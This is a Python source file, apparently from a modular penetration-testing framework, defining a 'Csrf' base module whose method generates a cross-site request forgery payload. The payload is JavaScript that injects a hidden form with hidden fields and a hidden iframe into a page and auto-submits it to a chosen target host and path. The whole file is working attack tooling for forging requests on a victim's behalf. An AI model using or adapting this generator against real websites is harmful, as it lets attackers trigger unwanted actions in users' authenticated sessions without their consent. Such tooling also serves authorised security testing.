from core.base.base_module import BaseModule
from core.base.option import OptString, OptPort, OptBool
from core.utils.printer import *

class Csrf(BaseModule):
	
	target = OptString("127.0.0.1", "Target IPv4, IPv6 address: 192.168.1.1", "yes")
	port = OptPort(80, "Target HTTP port", "yes")
	ssl = OptBool(False, "SSL enabled: true/false","no",True)
	
	def csrf_request(self, method="GET", path="/", data={}):
		""" Return csrf request """
		if not self.target.startswith("http"):
			if self.ssl:
				if not self.target.startswith("https://"):
					self.target = "https://"+self.target
			else:
				if not self.target.startswith("http://"):
					self.target = "http://"+self.target
		
		print_status("Generate csrf request...")
		name_form = self.random_text(8)
		form = f"<form action='{self.target}:{self.port}{path}' target='hiddenFrame' name='{name_form}' method='{method.upper()}'>"
		for name, value in data.items():
			form += f"<input type='hidden' name='{name}' value='{value}' />"
		form += "</form>"
		form += "<iframe name='hiddenFrame'  style='display:none'></iframe>"
		js_form = f"document.body.innerHTML += \"{form}\";"
		js_form += f"document.{name_form}.submit();"
		return js_form
